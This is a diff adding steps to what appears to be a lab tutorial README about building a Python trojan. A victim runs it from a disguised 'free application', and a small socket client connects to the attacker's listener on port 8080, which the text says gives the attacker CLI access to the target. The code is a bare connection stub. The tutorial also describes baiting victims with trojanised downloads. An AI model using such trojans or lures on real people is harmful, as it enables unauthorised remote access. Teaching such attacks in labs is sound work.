@@ -19,6 +19,8 @@ in this topology, the computers are in different vlans, and we are going to crea
 
 :star: Here the attacker by running this part of command start listening the to his port waiting for 
 any incoming connection:
+
+
 ```python
 #!/usr/bin/python
 import os
@@ -41,4 +43,58 @@ print (" ")
 <img src=images/5.PNG  alt="alt text" width="950" height="550">
 
 ##
+
+:star: In this photo we can see that the attacker has executed the python script and is waiting.
+
+# :zap: Target executes our python script :zap:
+
+:star: Step 2: Imagine the target has downloaded an executable file like a free application that our attacker uploaded befor from internet,
+now he want to install that application that contains our Trojan, so when he executes our file, our python script start working. 
+it asks the server name, we put the server's name [DESKTOP-E80I7RR] and the connection will be created between these two machines.
+as the result you can see ``` Connected to the server successfully ``` on CLI of the target PC.
+
+```python
+#!/usr/bin/python
+import os
+import socket
+
+s = socket.socket()
+port = 8080
+host = "127.0.0.1"
+host = input (str("Please enter the server address : "))
+
+
+s.connect((host,port))
+
+print (" ")
+print (" Connected to the server successfully")
+print (" ")
+
+```
+##
+<img src=images/6.PNG  alt="alt text" width="950" height="550">
+
+##
+
+# :zap: Connection on attacker's pc :zap:
+
+:star: As soon as the script is executed the attacker's machin will receive access to the CLI of the Target PC, and now we
+are ready to go. It shows us to which IP address is connected and on wich port as is shown on the next photo. 
+
+##
+<img src=images/7.PNG  alt="alt text" width="950" height="550">
+
+##
+
+
+
+
+
+
+
+
+
+
+
+
 
